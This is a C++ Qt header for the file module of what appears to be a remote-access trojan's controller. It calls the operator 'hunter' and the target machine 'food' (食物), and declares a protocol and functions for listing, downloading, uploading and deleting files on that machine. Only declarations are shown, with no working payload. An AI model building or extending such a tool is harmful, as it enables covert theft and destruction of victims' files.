// 文件操作模块的类

#ifndef FILE_H
#define FILE_H

#include <QWidget>
#include <QLabel>
#include <QApplication>
#include <QDesktopWidget>
#include <QListWidget>
#include "tcpserver.h"
#include "tcpsocket.h"
#include <QMenu>
#include <QDir>
#include <QFileIconProvider>
#include <QMessageBox>
#include <QTextCodec>
#include "filetransfer.h"

class File : public QWidget
{
    Q_OBJECT
public:
    explicit File(QWidget *parent = nullptr);

    // hunter向食物发送的指令
    const QByteArray CmdGetDirFiles = "GET_DIRS_FILES";   // 获取路径下的所有文件名和路径名
    const QByteArray CmdDownloadFile = "DOWNLOAD_FILE";   // hunter从食物也下载文件
    const QByteArray CmdUploadFile = "UPLOAD_FILE";       // hunter上传文件到食物
    const QByteArray CmdDeleteFile = "DELETE_FILE";       // hunter在食物删除文件

    // 食物向hunter发送的指令
    const QByteArray CmdSendDrives = "SEND_DRIVES";        // 发送盘符
    const QByteArray CmdSendDirs = "SEND_DIRS";            // 发送路径下的所有路径名
    const QByteArray CmdSendFiles = "SEND_FILES";          // 发送路径下的所有文件名
    const QByteArray CmdDeleteFileSuccess = "DELETE_SUCCESS";  // 成功删除文件
    const QByteArray CmdDeleteFileFailed = "DELETE_FAILED";    // 删除文件失败

    // 分割符号和结束符号，比如获取文件夹所有文件命令:FILES<分割符>FILEA<文件分割符>FILEB<文件分割符>FILEC<结束符号>
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";
    const QByteArray CmdFileSplit = "|";

    // 文件类型
    const QByteArray FileTypeDrive = "drive";
    const QByteArray FileTypeDir = "dir";
    const QByteArray FileTypeFile = "file";

    // 开始监控服务器，然后返回新的端口号
    int startFileServer(QString userName);

private:
    QListWidget *mFoodFileList;   // 食物文件列表
    QListWidget *mLocalFileList;   // 本机文件列表
    QMenu *mFoodMenu;             // 对食物列表的操作菜单
    QMenu *mLocalMenu;             // 对本机列表的操作菜单
    QDir _curFoodDir;      // 当前食物路径
    QDir _curLocalDir;      // 当前本机路径
    TcpServer *mServer;     // 文件监控服务端
    TcpSocket *mSock;       // 连接食物
    QString _userName;

    // 用于解码GBK
    QTextCodec *codec = QTextCodec::codecForName("GBK");

    // 对列表的操作
    const QByteArray _dirBack = ".."; // 返回上一页
    void addFilesToList(QListWidget *list, QList<QByteArray> strList,
                        QFileIconProvider::IconType iconType, QString type);
    QStringList getCurrentFile(QListWidget *list);
    QList<QByteArray> getLocalDrives();
    QList<QByteArray> getLocalDirs(QDir dir);
    QList<QByteArray> getLocalFiles(QDir dir);

    // 处理指令
    void processCommand(QByteArray &cmd, QByteArray &args);
    // 分解指令的参数，反回哈希表
    QHash<QByteArray, QByteArray> parseArgs(QByteArray &args);
    // 处理相应的指令
    void doSendDrives(QHash<QByteArray, QByteArray> &args);
    void doSendDirs(QHash<QByteArray, QByteArray> &args);
    void doSendFiles(QHash<QByteArray, QByteArray> &args);

signals:

public slots:
    // 加载食物目录
    void loadFoodDir(QListWidgetItem *item);
    // 刷新食物列表
    void refreshFoodList();
    // 刷新食物列表
    void refreshFoodList(QDir dir);
    // 下载文件
    void downloadFile();
    // 删除文件
    void deleteFile();

    // 加载本机目录
    void loadServerDir(QListWidgetItem *item);
    void loadServerDir(QDir dir);
    // 刷新本机列表
    void refreshServerList();
    // 上传本机文件
    void uploadFile();

    // 有新客户连接
    void newConnection(QTcpSocket *s);
    // 处理新数据
    void processBuffer();

protected:
    // 事件过滤，主要用来截取弹出菜单事件
    bool eventFilter(QObject *watched, QEvent *event);

    // 关闭
    void closeEvent(QCloseEvent *);
};

#endif // FILE_H
